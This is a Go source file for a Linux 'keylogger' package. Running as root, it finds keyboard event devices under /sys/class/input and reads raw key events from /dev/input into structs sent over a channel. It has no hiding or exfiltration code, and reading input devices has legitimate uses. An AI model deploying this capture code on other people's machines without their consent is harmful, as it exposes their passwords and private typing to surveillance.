package keylogger

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"strings"
	"syscall"

	"github.com/sirupsen/logrus"
)

// KeyLogger wrapper around file descriptior
type KeyLogger struct {
	fd *os.File
}

// New creates a new keylogger for a device path
func New(devPath string) (*KeyLogger, error) {
	k := &KeyLogger{}
	if !k.IsRoot() {
		return nil, errors.New("Must be run as root")
	}
	fd, err := os.Open(devPath)
	k.fd = fd
	return k, err
}

// FindKeyboardDevice by going through each device registered on OS
// Mostly it will contain keyword - keyboard
// Returns the file path which contains events
func FindKeyboardDevice() string {
	path := "/sys/class/input/event%d/device/name"
	resolved := "/dev/input/event%d"

	for i := 0; i < 255; i++ {
		buff, err := ioutil.ReadFile(fmt.Sprintf(path, i))
		if err != nil {
			logrus.Error(err)
		}

		// check if mouse is contained in the input event
		// if that is the case just skip.
		// We do this check as it seems that some mouses like the logitech MX mouse is also recognized as a mouse/keyboard
		if strings.Contains(strings.ToLower(string(buff)), "mouse") {
			continue
		}

		if strings.Contains(strings.ToLower(string(buff)), "keyboard") {
			return fmt.Sprintf(resolved, i)
		}
	}
	return ""
}

// Like FindKeyboardDevice, but finds all devices which contain keyword 'keyboard'
// Returns an array of file paths which contain keyboard events
func FindAllKeyboardDevices() []string {
	path := "/sys/class/input/event%d/device/name"
	resolved := "/dev/input/event%d"

	valid := make([]string, 0)

	for i := 0; i < 255; i++ {
		buff, err := ioutil.ReadFile(fmt.Sprintf(path, i))

		// prevent from checking non-existant files
		if os.IsNotExist(err) {
			break
		}
		if err != nil {
			logrus.Error(err)
		}

		// check if mouse is contained in the input event
		// if that is the case just skip.
		// We do this check as it seems that some mouses like the logitech MX mouse is also recognized as a mouse/keyboard
		if strings.Contains(strings.ToLower(string(buff)), "mouse") {
			continue
		}

		if strings.Contains(strings.ToLower(string(buff)), "keyboard") {
			valid = append(valid, fmt.Sprintf(resolved, i))
		}
	}
	return valid
}

// IsRoot checks if the process is run with root permission
func (k *KeyLogger) IsRoot() bool {
	return syscall.Getuid() == 0 && syscall.Geteuid() == 0
}

// Read from file descriptor
// Blocking call, returns channel
// Make sure to close channel when finish
func (k *KeyLogger) Read() chan InputEvent {
	event := make(chan InputEvent)
	go func(event chan InputEvent) {
		for {
			e, err := k.read()
			if err != nil {
				logrus.Error(err)
				close(event)
				break
			}

			if e != nil {
				event <- *e
			}
		}
	}(event)
	return event
}

// read from file description and parse binary into go struct
func (k *KeyLogger) read() (*InputEvent, error) {
	buffer := make([]byte, eventsize)
	n, err := k.fd.Read(buffer)
	if err != nil {
		return nil, err
	}
	// no input, dont send error
	if n <= 0 {
		return nil, nil
	}
	return k.eventFromBuffer(buffer)
}

// eventFromBuffer parser bytes into InputEvent struct
func (k *KeyLogger) eventFromBuffer(buffer []byte) (*InputEvent, error) {
	event := &InputEvent{}
	err := binary.Read(bytes.NewBuffer(buffer), binary.LittleEndian, event)
	return event, err
}

// Close file descriptor
func (k *KeyLogger) Close() error {
	if k.fd == nil {
		return nil
	}
	return k.fd.Close()
}
